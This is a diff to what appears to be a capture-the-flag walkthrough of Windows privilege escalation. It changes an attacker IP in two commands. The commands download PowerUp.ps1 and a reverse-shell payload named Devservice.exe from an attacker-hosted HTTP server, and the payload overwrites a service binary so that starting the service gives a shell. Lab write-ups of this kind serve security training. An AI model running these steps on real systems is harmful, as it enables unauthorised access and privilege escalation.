@@ -12,7 +12,7 @@ I uploaded Powersploit's `PowerUp.ps1` to find potential privilege escalation te
 I uploaded the file by starting a server:
 	`python3 -m http.server`
 I then downloaded the file on powershell:
-	`Invoke-WebRequest -Uri "http://10.6.0.144:8000/PowerUp.ps1" -OutFile "C:\Users\Sage\PowerUp.ps1"`
+	`Invoke-WebRequest -Uri "http://10.6.0.114:8000/PowerUp.ps1" -OutFile "C:\Users\Sage\PowerUp.ps1"`
 
 ### PowerUp
 
@@ -96,7 +96,7 @@ Thus, we can generate a payload with a tcp reverse shell with the following comm
 
 We can upload this payload the same way as we did before:
 
-	`Invoke-WebRequest -Uri "http://10.6.0.144:8000/Devservice.exe" -OutFile "C:\Program Files\Development Files\Devservice.exe"`
+	`Invoke-WebRequest -Uri "http://10.6.0.114:8000/Devservice.exe" -OutFile "C:\Program Files\Development Files\Devservice.exe"`
 
 This, when started, will provide us a shell as the user it was started with.
 
